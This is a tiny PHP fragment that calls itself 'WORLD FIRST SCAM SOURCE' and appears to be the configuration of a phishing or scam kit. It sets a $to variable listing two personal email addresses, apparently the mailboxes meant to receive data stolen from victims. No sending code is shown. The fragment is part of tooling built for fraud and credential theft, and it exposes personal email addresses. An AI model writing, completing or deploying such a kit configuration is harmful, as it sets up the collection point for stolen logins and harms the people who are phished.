<?

//scax.gq WORLD FIRST SCAM SOURCE


$to="debedebe@protonmail.com,thomas.potts50@hotmail.com";
?>
